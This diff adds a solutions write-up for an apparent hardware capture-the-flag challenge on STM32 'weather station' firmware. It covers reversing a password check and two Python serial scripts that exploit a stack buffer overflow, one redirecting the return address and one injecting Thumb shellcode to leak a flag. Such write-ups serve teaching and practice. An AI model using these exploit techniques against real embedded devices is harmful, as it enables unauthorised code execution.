@@ -1,0 +1,190 @@
+Solutions:
+
+
+# Weather station, challenge 1
+
+Plug the USB cable, install FTDI driver if needed, run a terminal. The correct speed to guess is 19200 8N1.
+
+
+# Weather station, challenge 2
+
+The reference to the string “Password: “ show you the right function to reverse. At the beginning of the function, 2 other string is used : “W362T7uC” and “SuperSec”, none is the password, it’s a little more complex. The advice is to comment the serial_scanf() function and all the loops. One major loop with 2 little loop inside. The first little loop just transforms the password and the second check that all the bytes of the computed password are 0x00. If so, the password is good. 
+W362T7uC[position] xor password[position]  -3 or -7 = 0
+-3 or -7 depend on the last bit of each char of the string SuperSec.
+For the first char :  ‘W’ xor n -7 = 0 Solving it is trivial :   ‘W’ xor n = 7  --> n = ‘W’ xor 7  --> n = ‘P’
+The password is ‘P455W0rD’ 
+(note the len of the password is hardcoded to 7, but you can enter a bigger string, this is useful for step 4!).
+
+
+# Weather station, challenge 3
+
+What happened when “Winter Is Coming” --> find the reference to this string to go to the right function and note the start address. Address is 0x800DFE0
+IMPORTANT: As the STM32 run in THUMB mode, each address stored in the stack must set it LSB to “1”. This means if you need to call the function at address 0x8001234 you must call 0x8001235.
+The next step is to find an overflow to smash the stack. The firmware asks you to enter 2 strings in 2 different places: the password and the custom brand name.  The custom brand name is the function to abuse, the password function check boundary. If you enter a too big string the weather base crash and display a minimalist debugger. The debugger is unusual but is here to show the overflow.
+To call the function at @ 0x800DFE0 you need to find the good padding on stack and to override the legit return address by pushing 0xE1DF0008. Another trick is to only enter several 0xE1DF0008 in place of the name and see how much are needed to trig the overflow. Once the string is entered, you need to exit the current brand name’s setup function to trig the exploit.
+The following python script does it. Boot the weather base and wait until the startup sequence is finished. Run the python script, then push the reset button. And look onscreen the nice easter egg !
+
+
+# Name:        exploitWinter
+# Author:      Phil
+
+import serial
+import time
+
+# configure the serial connections (the parameters differs on the device you are connecting to)
+ser = serial.Serial(port='COM8:', baudrate=19200)
+
+ser.close()
+#ser.isOpen()
+ser.open()
+
+strg = ''
+while strg != b'\r\n' :
+	strg = ser.readline()
+	print(strg)
+print(ser.readline())
+print(ser.readline())
+print(ser.read(10))         # skip "Password: "
+ser.write(b'P455W0rD\r');
+
+strg = ''
+while strg != b'-3- Setup Brand Name.\r\n' :
+	strg = ser.readline()
+	print(strg)
+
+print(ser.readline())       # skip b'\r\n'
+print(ser.read(12))         # skip "Selection : "
+ser.write(b'3')
+
+strg = ''
+while strg != b'-0- Exit to main.\r\n' :
+	strg = ser.readline()
+	print(strg)
+print(ser.readline())       # skip b'\r\n'
+print(ser.read(12))         # skip "Selection : "
+ser.write(b'4')
+
+print(ser.readline())       # skip  b'4\r\n'
+print(ser.read(48))         # skip b'Enter a new manufacturer name (MAX 8 chars !) : '
+ser.write(b'AZERTYUIOPQSDFGHJKLMWXCV\xE1\xDF\x00\x08\r')      # 24+4+1
+print(ser.readline())       # skip payload + b'\r\n'
+print(ser.read(12))         # skip "Selection : "
+
+ser.write(b'0')             # BOOM --> BOF is called
+
+print('end')
+
+
+
+# Weather station, challenge 4
+
+* I2C :
+Run a logical analyzer on the I2C bus, and see what the weather base is looking for (just after the reset). Chip ID “DE”, address “AD”. Then use the string displayed at reset to identify the good code to reverse. You find the code ask for I2C component “DE” at address “AD”. Then it check 2 bytes for the reply : “BEEF”. If the “BEEF” is found the serial is sent over I2C to component “0B”, addressee “0B”. Just need to record the string sent, the serial number & flag are sent this way.
+TODO: use the HYDRABUS to solve it, and give the script.
+
+* Shellcode-like exploit:
+The string “serial” give you the clue where the serial number is generated. But calling this code is not enough because it’s basically two sprintf() crafting a buffer ready to be sent over I2C.
+The shellcode is simple, just need to call this function, next load the address of the crated buffer to R0 and finish by calling the serial_printf().
+The most complicated task is to send the shellcode and call it. The first idea is to put the shellcode in the custom weather base name, and then to jump in the stack to trig it. But it’s impossible to leek the stack address; you can only try a reasonable range from the information given by the debugger. 
+The most efficient way to call a shellcode is to send it in a fixed memory buffer. And the password string is the right place. The length of this buffer is set to 0x666 to catch the eyes in reverse. The buffer is a general purpose one, so you need to pad the shellcode a little far to the beginning and put this address in the BOF from the custom name function. 
+
+# Name:        exploitSerial
+# Author:      Phil
+
+import serial
+import time
+
+# configure the serial connections (the parameters differs on the device you are connecting to)
+ser = serial.Serial(port='COM13', baudrate=19200)
+
+ser.close()
+#ser.isOpen()
+ser.open()
+
+strg = ''
+while strg != b'\r\n' :
+	strg = ser.readline()
+	print(strg)
+print(ser.readline())
+print(ser.readline())
+print(ser.read(10))         # skip "Password: "
+time.sleep(0.1)
+
+'''
+Overflow: 2000084c + 8 + 64 = 20000894 = 20000895
+calcul serial: 0800DA1C
+serial Buffer: 20000F2C
+serSend: 0800D1A8
+
+mov	r1,0xDA1D
+movt	r1,0x0800
+blx	r1
+loop:
+mov	r0,0x0F2C
+movt	r0,0x2000
+mov	r1,0xD1A9
+movt	r1,0x0800
+blx	r1
+bl	loop
+
+ASM Thumb:
+\x4d\xf6\x1d\x21\xc0\xf6\x00\x01\x88\x47\x40\xf6\x2c\x70\xc2\xf2\x00\x00\x4d\xf2\xa9\x11\xc0\xf6\x00\x01\x88\x47\xff\xf7\xf5\xff
+'''
+
+#ser.write(b'P455W0rD')		# good password
+ser.write(b'P455W0rD')		# good password
+time.sleep(0.1)
+ser.write(b'PaDdInGPaDdInG16')		# Pad 64 bytes
+time.sleep(0.1)
+ser.write(b'PaDdInGPaDdInG16')
+time.sleep(0.1)
+ser.write(b'PaDdInGPaDdInG16')
+time.sleep(0.1);
+ser.write(b'PaDdInGPaDdInG16')
+time.sleep(0.1)
+ser.write(b'\x4d\xf6\x1d\x21\xc0\xf6\x00\x01\x88\x47\x40\xf6\x2c\x70\xc2\xf2')		# shellcode part 1
+time.sleep(0.1)
+ser.write(b'\x00\x00\x4d\xf2\xa9\x11\xc0\xf6\x00\x01\x88\x47\xff\xf7\xf5\xff')		# shellcode part 2
+time.sleep(0.1)
+ser.write(b'\r')	# valid password
+time.sleep(0.1)
+
+print(ser.read(109))
+
+strg = ''
+while strg != b'-3- Setup Brand Name.\r\n' :
+	strg = ser.readline()
+	print(strg)
+
+print(ser.readline())       # skip b'\r\n'
+
+print(ser.read(12))         # skip "Selection : "
+
+ser.write(b'3')
+
+strg = ''
+while strg != b'-0- Exit to main.\r\n' :
+	strg = ser.readline()
+	print(strg)
+print(ser.readline())       # skip b'\r\n'
+
+print(ser.read(12))         # skip "Selection : "
+
+ser.write(b'4')
+
+print(ser.readline())       # skip  b'4\r\n'
+
+print(ser.read(48))         # skip b'Enter a new manufacturer name (MAX 8 chars !) : '
+
+ser.write(b'AZERTYUIOPQSDFGHJKLMWXCV\x95\x08\x00\x20\r')      # addr= 0x2000084C + 8 + 64 + 1 = 20000895
+
+print(ser.readline())       # skip payload + b'\r\n'
+
+print(ser.read(12))         # skip "Selection : "
+
+ser.write(b'0')             # BOOM --> BOF is called
+
+while True :
+	strg = ser.read(103)
+	print(strg)
+
